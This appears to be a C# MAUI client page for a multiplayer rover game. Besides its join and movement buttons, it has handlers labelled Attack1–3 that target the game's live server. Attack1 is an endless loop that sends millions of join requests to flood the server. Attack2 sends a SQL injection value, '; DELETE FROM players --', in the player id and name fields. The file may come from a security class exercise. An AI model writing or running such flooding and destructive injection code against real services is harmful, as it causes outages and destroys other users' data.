
using Newtonsoft.Json;
using System.Net.Http.Json;

namespace SnowRover;

public partial class MainPage : ContentPage
{
    HttpClient httpClient;
    JoinResponse gameStatus;
    StatusResult statusResult;
    int ingenuityRow;
    int ingenuityCol;
    public Color color = Colors.Red;
    JoinResponse joinResponse;
    public Grid MapGrid { get; set; }
    string gameID;

    public MainPage()
    {
        InitializeComponent();


    }
    private async void JoinGame_Clicked(object sender, EventArgs e)
    {
        httpClient = new HttpClient { BaseAddress = new Uri("https://snow-rover.azurewebsites.net") };

        gameID= GameIDEntry.Text;
        var playerName = PlayerNameEntry.Text;
        //hang on to these for later

        // Your logic to join the game using gameID and playerName
        var response = await httpClient.GetAsync($"/game/join?gameId={gameID}&name={playerName}");
        if (response.IsSuccessStatusCode)
        {
            var content = await response.Content.ReadAsStringAsync();

            gameStatus = JsonConvert.DeserializeObject<JoinResponse>(content);

            ingenuityRow = gameStatus.StartingRow;
            ingenuityCol = gameStatus.StartingColumn;

            statusResult = await httpClient.GetFromJsonAsync<StatusResult>($"/game/status?token={gameStatus.Token}");
            GameStatusLabel.Text = $"Game status: {statusResult.status}";

        }
        else
        {
            // Handle the error response
            await DisplayAlert("Error", "Failed to join game, please try again.", "OK");
        }
    }

    private async void Move_Clicked(object sender, EventArgs e)
    {
        statusResult = await httpClient.GetFromJsonAsync<StatusResult>($"/game/status?token={gameStatus.Token}");

        GameStatusLabel.Text = $"Game status: {statusResult.status}";

        if (statusResult.status == "Playing")
        {
            DirectionButtons.IsVisible = true;
            //LowResolutionMap.Text = gameStatus.LowResolutionMap.Lo;
            //LowResolutionMap lowResolutionMap = new LowResolutionMap(gameStatus);
        }



    }
    private void Button_Clicked(object sender, EventArgs e)
    {

        LowResolutionMap map = new LowResolutionMap(gameStatus);
        RoverMap roverMap = new RoverMap(gameStatus);
        //Grid MapGrid = new Grid();
        // int[,] highResMap = map.CreateHighResolutionMap();
        // MapGrid = new Grid();

        // for (int row = 0; row < highResMap.GetLength(0); row++)
        // {
        //     for (int column = 0; column < highResMap.GetLength(1); column++)
        //     {
        //         int difficulty = highResMap[row, column];
        //         var highResolutionCell = new BoxView();


        //         if (difficulty <= 100)
        //         {
        //             highResolutionCell.BackgroundColor = Colors.Green;
        //         }
        //         else if (difficulty <= 150)
        //         {
        //             highResolutionCell.BackgroundColor = Colors.LightGreen;
        //         }
        //         else if (difficulty <= 200)
        //         {
        //             highResolutionCell.BackgroundColor = Colors.Yellow;
        //         }
        //         else
        //         {
        //             highResolutionCell.BackgroundColor = Colors.Red;
        //         }

        //         MapGrid.Add(highResolutionCell, row, column);
        //     }
        // }
        //BindingContext = MapGrid;



    }
    private async void Forward_Clicked(object sender, EventArgs e)
    {
        var direction = "Forward";
        var response = await httpClient.GetAsync($"/game/moveperseverance?token={gameStatus.Token}&direction={direction}");
        if (response.IsSuccessStatusCode)
        {
            var moveResult = await response.Content.ReadFromJsonAsync<MoveResponse>();
            GameStatusLabel.Text = $"Game status: {moveResult.Message}";
            CurrentLocationLabel.Text = $"Current row:{moveResult.Row}, current column:{moveResult.Column}";


            GameStatusLabel.Text = $"Game s tatus: {statusResult.status}";
        }
        else
        {
            // Handle the error response
            await DisplayAlert("Error", "Move failed, please try again.", "OK");
        }
    }

    private async void Left_Clicked(object sender, EventArgs e)
    {
        var direction = "Left";
        var response = await httpClient.GetAsync($"/game/moveperseverance?token={gameStatus.Token}&direction={direction}");
        if (response.IsSuccessStatusCode)
        {
            var moveResult = await response.Content.ReadFromJsonAsync<MoveResponse>();
            GameStatusLabel.Text = $"Game status: {moveResult.Message}";
            CurrentLocationLabel.Text = $"Current row:{moveResult.Row}, current column:{moveResult.Column}";


            GameStatusLabel.Text = $"Game s tatus: {statusResult.status}";
        }
        else
        {
            // Handle the error response
            await DisplayAlert("Error", "Move failed, please try again.", "OK");
        }
    }
    private async void Right_Clicked(object sender, EventArgs e)
    {
        var direction = "Right";
        var response = await httpClient.GetAsync($"/game/moveperseverance?token={gameStatus.Token}&direction={direction}");
        if (response.IsSuccessStatusCode)
        {
            var moveResult = await response.Content.ReadFromJsonAsync<MoveResponse>();
            GameStatusLabel.Text = $"Game status: {moveResult.Message}";
            CurrentLocationLabel.Text = $"Current row:{moveResult.Row}, current column:{moveResult.Column}";


            GameStatusLabel.Text = $"Game s tatus: {statusResult.status}";
        }
        else
        {
            // Handle the error response
            await DisplayAlert("Error", "Move failed, please try again.", "OK");
        }
    }
    private async void Back_Clicked(object sender, EventArgs e)
    {
        var direction = "Reverse";
        var response = await httpClient.GetAsync($"/game/moveperseverance?token={gameStatus.Token}&direction={direction}");
        if (response.IsSuccessStatusCode)
        {
            var moveResult = await response.Content.ReadFromJsonAsync<MoveResponse>();
            GameStatusLabel.Text = $"Game status: {moveResult.Message}";
            CurrentLocationLabel.Text = $"Current row:{moveResult.Row}, current column:{moveResult.Column}";


            GameStatusLabel.Text = $"Game s tatus: {statusResult.status}";
        }
        else
        {
            // Handle the error response
            await DisplayAlert("Error", "Move failed, please try again.", "OK");
        }
    }

    private async void Attack1_Clicked(object sender, EventArgs e)
    {

        string playerID;
        string playerName;
        HttpClient httpClient = new HttpClient { BaseAddress = new Uri("https://snow-rover.azurewebsites.net") };
        while (true)
        {
            for (int i = 0; i <= 100000; i++)
            {
                for (int c=0; c<=50000;c++)
                {
                    playerID ="bot"+ i;
                    playerName = "bot" + i;
                    var response = await httpClient.GetAsync($"/game/join?gameId={gameID}&name={playerName}&id={playerID}");

                };
                for (int c = 0; c <= 50000; c++)
                {
                    playerID = "bot" + i;
                    playerName = "bot" + i;
                    var response = await httpClient.GetAsync($"/game/join?gameId={gameID}&name={playerName}&id={playerID}");
                };

            }

        }

       

    }
    

    public class StatusResult
    {
        public string status { get; set; }
    }


    public class MoveResponse
    {
        public int Row { get; set; }
        public int Column { get; set; }
        public int BatteryLevel { get; set; }
        public Neighbor[] Neighbors { get; set; }
        public string Message { get; set; }
        public string Orientation { get; set; }
    }

    private async void Attack2_Clicked(object sender, EventArgs e)
    {
        var playerID = "; DELETE FROM players --";
        var playerName = "; DELETE FROM players --";
        HttpClient httpClient = new HttpClient { BaseAddress = new Uri("https://snow-rover.azurewebsites.net") };
        var response = await httpClient.GetAsync($"/game/join?gameId={gameID}&name={playerName}&id={playerID}");
    }

    private async void Attack3_Clicked(object sender, EventArgs e)
    {
       
        var playerName = "p";
        var response = await httpClient.GetAsync($"/game/join?gameId={gameID}&name={playerName}");
        if (response.IsSuccessStatusCode)
        {
            var content = await response.Content.ReadAsStringAsync();

            joinResponse = JsonConvert.DeserializeObject<JoinResponse>(content);
           
            for (int i = 0;i<10;i++)
            {
                GameStatusToken.Text= joinResponse.Token;
            }
          

        }
      
    }
}

